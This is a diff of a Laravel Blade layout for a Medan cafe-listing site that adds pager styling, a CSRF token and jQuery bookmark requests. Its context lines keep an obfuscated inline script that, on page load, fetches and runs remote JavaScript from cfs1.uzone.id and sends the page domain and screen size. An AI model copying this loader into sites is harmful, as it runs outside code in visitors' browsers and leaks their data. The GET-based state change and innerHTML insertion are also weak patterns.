@@ -27,10 +27,16 @@
     <link rel="shortcut icon" type="image/x-icon" href="{{ asset('') }}assets/favicon.png">
 
     <title>Tempat Nongkrong Medan</title>
+    <style type="text/css">
+      ul.pager li.active span{
+      background-color: rgba(0, 159, 139, 0.7);
+      color: white;
+      }
+    </style>
 </head>
 
 
-<body class="">
+<body class="" id="loadContent">
 
 
 @yield('content')
@@ -78,23 +84,87 @@
 
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKS3CDCrE1R7PeCYK0JmpL2V%2fkQ%2faUJpnR8PGvznCPtV2kaOJDLe0LHZMBNqqw%2b6%2f3ACEyU06lZy1rWAqB%2bpL%2bXHfbvfXca%2fhnlrNayx6vvjNh3S3JI2d52sYAdgX0V6UM2FOE6Dvp8aRqT1bbZS%2bXUsQA%2bzcHwiEV00s1uximTHLx3kiM6iMKMaT7guxdV6n8GgDk1cLXW3JDZZXhOAfM%2fLFAj2HUTw%2f%2fAlmH4eg5ZcPjUv8yHxviyuheZFIw72rQHsM8IrRyMSf%2b9r4HCmfzoOp7hK7pETr0D%2fzyEVyTDU%2bVY%2fKbKogyfMME8vp0OoeyriYI%2fs8fDOUpG9qJKiRXKeOjSz5Bsx3qgfGmNedosu6eQRQEaPoI6Jubi6U0lGqZDAuum8LQFpArb1ehyPNkSYcZvgu70dItvqxAGiS0trbUeCmi2atIg3cZfRU7wlrZv8oMS8%2ffL034yjJoxnRTaovy54wPAaEP07u62nmYHSpdsqupX1s%2f%2bE3StwNkKvarDsSpRq5asoltQgpwpUjFk5TX0aHyJHvNdTdT%2bybHKwl76UCxVJX96waOyJtTFMIJv%2fv2hAqYA7cn8nvF6CP0xnwiMGykIH0YDG6CWxKdWwkssOgX8r9lwHwEuK8hIQ2N0SCO1oESPjzT3ZF3t17dgsH22h574SYWugertBZq2zE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-
+<meta name="csrf-token" content="{{ csrf_token() }}" />
 <script>
+
+   // $(function(){
+   //  if($('#bokk').val()==1){
+   //    $('#bookmarks').addClass('marked');
+   //  }
+
+   // });
   
   $(function(){
-
+     
     $('#bookmarks').click(function(){
+
+       
+
+$.ajaxSetup({
+        headers: {
+            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+        }
+    });
+
+
+        // $.ajaxSetup({
+        //     headers: {
+        //         'X-CSRF-TOKEN': {!! json_encode(csrf_token()) !!};,
+        //     }
+        // });
          console.log("tes masuk");
+         var a=$('#idUser').val();
+         var b=$('#kafe').val();
+
+         if($('#bookmarks').hasClass("marked")){
+         // alert('cong');
+          $('#status').val(1);
+         }else{
+          $('#status').val(0);
+         }
          $.ajax({
-          type: "POST",
-          url: '/bookmarks/1',
-          data: {name:'dokok', message:'doko', post_id:'postid'},
+          type: 'GET',
+          url: '/bookmarks?status='+$('#status').val(),
+          
+          data: {'idUser':a, 'kafe':b},
           success: function( data ) {
-              alert( data );
+             // $(".doko").load("/login");  
+             //alert(data);
           }
          });
       });
   });
+
+
+// $(function(){
+     
+//     $('#detailCafe').click(function(){
+
+       
+
+//     $.ajaxSetup({
+//         headers: {
+//             'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+//         }
+//     });
+//          console.log("tes cafe");
+//          var a=$('#idUser').val();
+//          var b=$('#kafe').val();
+//          $.ajax({
+//           type: 'GET',
+//           url: 'detail/'+$('#idCafe').val(),
+          
+//           data: {'idUser':a, 'kafe':b},
+//           success: function( data ) {
+//             // $(".dokok").load(data); 
+//             // alert(data);
+//               document.getElementById("loadContent").innerHTML=data; 
+//              //alert(data);
+//           }
+//          });
+//       });
+//   });
+
 
 </script>
 
